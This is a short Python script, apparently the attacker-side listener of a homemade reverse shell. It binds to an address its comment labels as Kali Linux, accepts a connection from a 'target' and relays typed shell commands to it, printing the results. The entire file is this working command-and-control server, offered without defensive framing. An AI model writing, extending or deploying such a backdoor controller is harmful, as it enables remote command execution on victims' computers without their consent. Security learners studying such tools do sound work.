import socket
import json

#takes data we are going to send
def reliable_send(data):
    jsondata=json.dumps(data) #store actual command
    target.send(jsondata.encode()) #send encoded data to target.


def reliable_recv():
    data= ''
    while True:
        try:
            #get 1024 bites from  and add it to the previous received data
            data = data + target.recv(1024).decode().rstrip() #decode data and restrip it from additional chars
            return json.loads(data)
        except ValueError:
	        continue

def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command=='quit':
            break
        else:
            result = reliable_recv()
            print(result)
        pass
    pass

#first establish a connection between Payload and Server.
sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(("192.168.0.208",5555)) # Kali linux IP adress

print("[+] Listening for Connection")

sock.listen(5)# we listen to up to 5 different connections

target, ip = sock.accept()

print("[+] Target Connected from: ",str(ip))

target_communication()
